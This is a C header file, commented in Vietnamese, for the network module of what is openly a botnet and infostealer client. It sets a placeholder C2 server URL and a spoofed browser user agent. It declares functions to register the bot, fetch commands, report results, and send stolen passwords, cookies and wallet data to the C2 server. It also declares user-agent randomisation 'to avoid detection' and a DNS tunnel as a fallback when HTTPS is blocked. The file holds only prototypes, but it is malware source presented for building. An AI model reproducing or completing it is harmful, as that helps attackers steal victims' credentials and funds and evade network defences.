/**
 * bot_network.h
 * Khai bao hang so va prototype cho giao tiep mang cua bot
 */

#ifndef BOT_NETWORK_H
#define BOT_NETWORK_H

#include <stddef.h>

/* Cau hinh C2 server */
#ifndef C2_SERVER_URL
    #define C2_SERVER_URL "https://your-c2-server.com:8443"
#endif

#ifndef C2_USER_AGENT
    #define C2_USER_AGENT "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
#endif

/* Timeout ket noi (giay) */
#define NETWORK_TIMEOUT 30
#define DNS_TIMEOUT 5

/* Kich thuoc buffer */
#define RECV_BUFFER_SIZE 65536
#define SEND_BUFFER_SIZE 65536
#define URL_MAX_LENGTH 2048

/**
 * Khoi tao ket noi den C2 server
 * Dau vao: server_url - URL cua C2 server
 *          bot_id - ID cua bot (cap nhat sau khi dang ky)
 *          encryption_key - khoa ma hoa
 *          user_agent - user agent de su dung
 * Tra ve: 1 neu thanh cong, 0 neu that bai
 */
int ket_noi_c2(const char* server_url, const char* bot_id, 
               const char* encryption_key, const char* user_agent);

/**
 * Dang ky bot moi voi C2 server
 * Dau vao: server_url - URL cua C2 server
 *          bot_id_out - buffer de nhan bot ID
 *          bot_id_size - kich thuoc buffer
 *          enc_key_out - buffer de nhan encryption key
 *          enc_key_size - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int dang_ky_bot(const char* server_url, char* bot_id_out, size_t bot_id_size,
                char* enc_key_out, size_t enc_key_size);

/**
 * Checkin va nhan lenh tu C2 server
 * Dau vao: server_url - URL cua C2 server
 *          bot_id - ID cua bot
 *          encryption_key - khoa ma hoa
 *          lenh_out - buffer de nhan lenh
 *          lenh_size - kich thuoc buffer
 * Tra ve: so lenh nhan duoc (>0), 0 neu khong co lenh, -1 neu loi
 */
int checkin_nhan_lenh(const char* server_url, const char* bot_id,
                      const char* encryption_key, char* lenh_out, size_t lenh_size);

/**
 * Gui ket qua thuc thi lenh ve C2
 * Dau vao: server_url - URL cua C2 server
 *          bot_id - ID cua bot
 *          encryption_key - khoa ma hoa
 *          du_lieu - du lieu JSON can gui
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int gui_ket_qua(const char* server_url, const char* bot_id,
                const char* encryption_key, const char* du_lieu);

/**
 * Gui du lieu steal ve C2
 * Dau vao: server_url - URL cua C2 server
 *          bot_id - ID cua bot
 *          encryption_key - khoa ma hoa
 *          loai_du_lieu - loai du lieu (passwords, cookies, wallets...)
 *          du_lieu - du lieu JSON can gui
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int gui_du_lieu_steal(const char* server_url, const char* bot_id,
                      const char* encryption_key, const char* loai_du_lieu,
                      const char* du_lieu);

/**
 * Tao user agent ngau nhien de tranh phat hien
 * Dau vao: buffer - buffer de chua user agent
 *          kich_thuoc - kich thuoc buffer
 */
void tao_user_agent(char* buffer, size_t kich_thuoc);

/**
 * Phan giai DNS (co fallback)
 * Dau vao: ten_mien - ten mien can phan giai
 *          ip_out - buffer de chua IP
 *          ip_size - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int phan_giai_dns(const char* ten_mien, char* ip_out, size_t ip_size);

/**
 * Gui du lieu qua DNS tunnel (fallback khi HTTPS bi chan)
 * Dau vao: ten_mien - ten mien C2
 *          du_lieu - du lieu can gui
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int dns_tunnel_gui(const char* ten_mien, const char* du_lieu);

/**
 * Nhan du lieu qua DNS tunnel
 * Dau vao: ten_mien - ten mien C2
 *          buffer - buffer de nhan du lieu
 *          kich_thuoc - kich thuoc buffer
 * Tra ve: 0 neu thanh cong, -1 neu that bai
 */
int dns_tunnel_nhan(const char* ten_mien, char* buffer, size_t kich_thuoc);

#endif /* BOT_NETWORK_H */